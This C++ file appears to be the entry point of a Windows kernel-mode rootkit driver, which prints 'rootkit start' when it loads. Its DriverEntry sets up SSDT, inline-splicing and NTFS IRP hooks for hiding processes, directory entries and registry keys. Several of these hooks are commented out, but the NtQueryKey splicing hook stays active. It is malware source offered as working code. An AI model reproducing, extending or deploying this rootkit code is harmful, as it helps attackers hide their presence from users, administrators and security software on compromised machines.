#pragma once
#include "stdafx.h"

#include "Structs\Structs.h"

#include "SSDTManager\SSDTManager.h"
#include "SSDTManager\SSDTHooksManager.h"
#include "KernelManager\KernelManager.h"
#include "SplicingManager\SplicingManager.h"
#include "NtfsIRPManager\NtfsIRPManager.h"

#include "Hooks\SSDTHooks\ZwQuerySystemInformationHooks.h"
#include "Hooks\SplicingHooks\ZwDeviceIoControlFileHooks.h"
#include "Hooks\SplicingHooks\ZwEnumerateKeyHooks.h"
#include "Hooks\SplicingHooks\ZwQueryKeyHooks.h"
#include "Hooks\IRPHooks\NtfsIRPHooks.h"

#include "RootkitHooksConfig.h"

#include "Utils\List.h"

extern "C" DRIVER_INITIALIZE DriverEntry;
extern "C" DRIVER_UNLOAD DriverUnload;

extern "C" NTSTATUS DriverEntry(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)
{
    NTSTATUS retStatus;

    UNREFERENCED_PARAMETER(registryPath);
    
    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL,"rootkit start\n");        

    if (!KernelManager::getInstance().InitializeInstanceData())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Kernel Manager Init error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }    

    if (!SSDTManager::getInstance().InitializeInstanceData())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "SSDT Manager Init error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }    

    if (!SplicingManager::getInstance().InitializeInstanceData())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Splicing Manager Init error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }

    if (!NtfsIRPManager::getInstance().InitializeInstanceData())
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "NTFS IDT Manager Init error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }

    SSDTHook hookNtQuerySystemInformation;

    hookNtQuerySystemInformation.funcName = "NtQuerySystemInformation";
    hookNtQuerySystemInformation.HookFunc = reinterpret_cast<ULONG_PTR>(&NtQuerySystemInformationHook_HideProcess);

    /*if (!SSDTHookManagaer::getInstance().SetHook(hookNtQuerySystemInformation))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set SSDT Hook error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }*/

    SplicingHook hookZwDeviceIoControlFile;
    hookZwDeviceIoControlFile.funcName = "NtDeviceIoControlFile"; 
    hookZwDeviceIoControlFile.HookFunc = reinterpret_cast<ULONG_PTR>(&ZwDeviceIoControlFileHook_AddElement);
    hookZwDeviceIoControlFile.OriginalFunc = SSDTManager::getInstance().GetFuncAddres(
        SSDTManager::getInstance().GetIndexSyscallFromNtdll("NtDeviceIoControlFile"));

    /*if (!SplicingManager::getInstance().SetHook(hookZwDeviceIoControlFile))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set Splicing Hook error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    } */  

    IRPHook hook;
    hook.IRP = IRP_MJ_DIRECTORY_CONTROL;
    hook.HookFunc = HookDirectoryControl;

    /*if (!NtfsIRPManager::getInstance().SetHook(hook))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set IRP Hook error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }*/

    /*SplicingHook hookZwEnumerateKey;
    hookZwEnumerateKey.funcName = "NtEnumerateKey";
    hookZwEnumerateKey.HookFunc = reinterpret_cast<ULONG_PTR>(&ZwEnumerateKeyHook_AnatherKeys);
    hookZwEnumerateKey.OriginalFunc = SSDTManager::getInstance().GetFuncAddres(
        SSDTManager::getInstance().GetIndexSyscallFromNtdll("NtEnumerateKey"));

    if (!SplicingManager::getInstance().SetHook(hookZwEnumerateKey))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set Splicing Hook error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    } */

    SplicingHook hookZwQueryKey;
    hookZwQueryKey.funcName = "NtQueryKey";
    hookZwQueryKey.HookFunc = reinterpret_cast<ULONG_PTR>(&ZwQueryKeyHook_AnatherKeys);
    hookZwQueryKey.OriginalFunc = SSDTManager::getInstance().GetFuncAddres(
        SSDTManager::getInstance().GetIndexSyscallFromNtdll("NtQueryKey"));

    if (!SplicingManager::getInstance().SetHook(hookZwQueryKey))
    {
        DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Set Splicing Hook error\n");
        retStatus = STATUS_FAILED_DRIVER_ENTRY;
        return retStatus;
    }

    

    driverObject->DriverUnload = DriverUnload;
    retStatus = STATUS_SUCCESS;
    return retStatus;
}

VOID DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "Driver unload\n");
    SSDTHookManagaer::getInstance().OnUnload();
    SplicingManager::getInstance().OnUnload();
    NtfsIRPManager::getInstance().OnUnload();
    SSDTManager::getInstance().FreeData();    
    return;
}
